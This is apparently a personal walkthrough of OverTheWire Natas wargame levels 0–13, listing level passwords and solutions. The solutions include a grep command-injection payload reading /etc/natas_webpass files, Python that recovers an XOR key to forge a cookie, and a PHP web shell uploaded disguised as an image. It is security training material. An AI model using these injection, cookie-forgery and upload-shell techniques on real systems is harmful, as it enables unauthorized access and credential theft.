
# Natas #overthewire #otw #natas

| LVL                                             | Username | Password                         | Location                                                                                                                         |
| ----------------------------------------------- | -------- | -------------------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| [0](http://natas0.natas.labs.overthewire.org)   | natas0   | natas0                           | provided                                                                                                                         |
| [1](http://natas1.natas.labs.overthewire.org)   | natas1   | g9D9cREhslqBKtcA2uocGHPfMZVzeFK6 | Source code                                                                                                                      |
| [2](http://natas2.natas.labs.overthewire.org)   | natas2   | h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7 | source code                                                                                                                      |
| [3](http://natas3.natas.labs.overthewire.org)   | natas3   | G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q | <http://natas2.natas.labs.overthewire.org/files/users.txt>                                                                       |
| [4](http://natas4.natas.labs.overthewire.org)   | natas4   | tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm | view-source:<http://natas3.natas.labs.overthewire.org/robots.txt><br><http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt> |
| [5](http://natas5.natas.labs.overthewire.org)   | natas5   | Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD | http header referer                                                                                                              |
| [6](http://natas6.natas.labs.overthewire.org)   | natas6   | fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR | cookie value                                                                                                                     |
| [7](http://natas7.natas.labs.overthewire.org)   | natas7   | jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr | <http://natas6.natas.labs.overthewire.org/includes/secret.inc><br>FOEIUWGHFEEUHOFUOIU --> input field                            |
| [8](http://natas8.natas.labs.overthewire.org)   | natas8   | a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB | from source code: path hint<br><http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8> (php require) |
| [9](http://natas9.natas.labs.overthewire.org)   | natas9   | Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd | source code - found encoded secret [otw/natas/README#Natas 9](otw/natas/README#Natas 9.md)                                                                  |
| [10](http://natas10.natas.labs.overthewire.org) | natas10  | D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE | see [otw/natas/README#Natas 10](otw/natas/README#Natas 10.md)                                                                                                |
| [11](http://natas11.natas.labs.overthewire.org) | natas11  | 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg | see 10 and replace the 10 with 11 in the path                                                                                    |
| [12](http://natas12.natas.labs.overthewire.org) | natas12  | YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG | see [snippets/natas_11.py](snippets/natas_11.py.md)                                                                                                     |
| [13](http://natas13.natas.labs.overthewire.org) | natas13  | lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9 | see [otw/natas/README#Natas 12](otw/natas/README#Natas 12.md)                                                                                                |

## Natas 9

```python
#!/usr/bin/env python3

import binascii
import base64

encoded_secret = "3d3d516343746d4d6d6c315669563362"

def decode_secret(encoded):
    # Convert hex to binary (ASCII)
    binary = binascii.unhexlify(encoded)

    # Reverse the string
    reversed_str = binary[::-1]

    # Base64 decode
    decoded = base64.b64decode(reversed_str)

    return decoded

decoded_secret = decode_secret(encoded_secret)
print(decoded_secret.decode('utf-8'))

```

## Natas 10

```js
// SNIP
if($key != "") {
	passthru("grep -i $key dictionary.txt");
}
// SNIP
```

To exploit this code, we can manipulate the `needle` parameter in the URL to execute arbitrary commands. For example:

```http
http://natas9.natas.labs.overthewire.org/?needle=s+%2Fetc%2Fpasswd&submit=Search
```

By passing `s+%2Fetc%2Fpasswd` as the `needle` value, we are effectively executing `grep -i s /etc/passwd`, which returns the contents of `/etc/passwd`.

To retrieve the password for Natas 10, we can use the following payload:

```bash
# payload: '[aeiou]' /etc/natas_webpass/natas10 #
#: echo "'[aeiou]' /etc/natas_webpass/natas10 #" | urlencode
%27%5baeiou%5d%27+%2fetc%2fnatas_webpass%2fnatas10+%23%0a
```

This payload uses a regular expression to match any vowel (a, e, i, o, u) and looks for these characters in the `natas10` password file. The `-i` option in `grep` makes the search case-insensitive. The `#` character is used to comment out the rest of the line, although it's not necessary in this specific context; it can help make the command execute faster by ignoring any trailing commands.

The full URL with the payload would look like this:

```http
http://natas9.natas.labs.overthewire.org/?needle=%27%5Baeiou%5D%27%20%2Fetc%2Fnatas%5Fwebpass%2Fnatas10%20%23&submit=Search
```

This URL sends the following command to the server:

```bash
grep -i '[aeiou]' /etc/natas_webpass/natas10 # dictionary.txt <-- dictionary.txt is now a comment
```

The server returns the contents of `/etc/natas_webpass/natas10` where any vowel is present, effectively revealing the password for Natas 10.

## Natas 11

```js
// SNIP
if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
// SNIP
```

In this challenge, the code checks if the `$key` parameter contains any illegal characters (`;`, `|`, or `&`). If it does, an error message is printed. Otherwise, the `grep` command is executed with the `$key` parameter.
Since our previous payload for Natas 10 did not include any illegal characters, we can reuse it for this challenge.

Recall the payload from Natas 10:

```bash
# payload: '[aeiou]' /etc/natas_webpass/natas11 #
#: echo "'[aeiou]' /etc/natas_webpass/natas11 #" | urlencode
%27%5baeiou%5d%27+%2fetc%2fnatas_webpass%2fnatas11+%23%0a
```

## Natas 12

In this CTF challenge, the objective is to exploit a vulnerability in the handling of encrypted cookies. We need to retrieve the encryption key, modify the cookie to change a value, and then re-encrypt the cookie to gain access.

### Step 1: Get the Encryption Key

First, we need to obtain the encryption key by analyzing the provided cookie data.

#### Code Explanation

1. **Import necessary libraries**:
    - `base64` for encoding and decoding base64 strings.
    - `json` for handling JSON data.
    - `urllib.parse` for URL encoding.
2. **Decode the base64 encoded string**:
    - The cookie data is base64 encoded. We need to decode it to get the ciphertext.
3. **Known plaintext data**:
    - From the source code, we know the structure of the plaintext data.
4. **Calculate the XOR key**:
    - The key is found by XORing the ciphertext with the known plaintext.

```python
import base64
import json
import urllib.parse

# Decode the base64 encoded string (cookie value)
cookie_data = "MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY="  # Replace with actual cookie value
ciphertext = base64.b64decode(cookie_data)

# Known plaintext data (from source code)
plaintext = json.dumps({"showpassword" : "no","bgcolor" : "#ffffff"})

# Function to calculate the XOR key
def xor_decrypt(ciphertext, plaintext):
    key = b''
    for i in range(len(ciphertext)):
        key += bytes([ciphertext[i] ^ plaintext.encode()[i]])
    return key

# Get the XOR key
key = xor_decrypt(ciphertext, plaintext)

print("Key:", key)
```

### Step 2: Encrypt the New Array

Now that we have the encryption key, we can modify the plaintext to change the "showpassword" value to "yes" and re-encrypt it.

#### Code Explanation

1. **Define the XOR key**:
    - Use the previously obtained key.
2. **Create the new JSON data**:
    - Modify the value of "showpassword" to "yes".
3. **Encrypt the new plaintext**:
    - Use the XOR key to encrypt the modified plaintext.
4. **Encode the new encrypted data in base64**:
    - The resulting encrypted data needs to be base64 encoded.
5. **URL encode the new cookie**:
    - URL encoding ensures that the cookie can be safely transmitted.

```python
import base64
import json
import urllib.parse

# The key obtained from the previous step
key = 'KNHL'  # Adjust this based on the obtained key, repeat as necessary

# New JSON data with modified value
cookie_replacement = json.dumps({"showpassword" : "yes","bgcolor" : "#ffffff"})

# Function to encrypt the plaintext with the XOR key
def xor_encrypt(plaintext, key):
    ciphertext = b''
    for i in range(len(plaintext)):
        ciphertext += bytes([ord(plaintext[i]) ^ ord(key[i % len(key)])])
    return ciphertext

# Encrypt the new plaintext with the XOR key
new_encrypted_data = xor_encrypt(cookie_replacement, key)

# Encode the new encrypted data in base64
new_cookie = base64.b64encode(new_encrypted_data).decode()

# URL encode the new cookie
print("New cookie value:", urllib.parse.quote(new_cookie))
```

### Summary

1. **Retrieve the XOR key** by decoding the provided cookie and comparing it with known plaintext.
2. **Create new encrypted data** with the desired modifications.
3. **Encode and URL encode** the new cookie for use.

This process exploits the weakness in the encryption method used in the challenge, allowing us to gain the desired access.

## Natas 13

```bash
echo "<?php echo shell_exec('cat /etc/natas_webpass/natas13'); ?>" > thisIsAImage.jpg
```

![Screenshot](files/Screenshot%202024-06-06%20164733.png)

> Change file type from `jpg` to `php` and hit upload
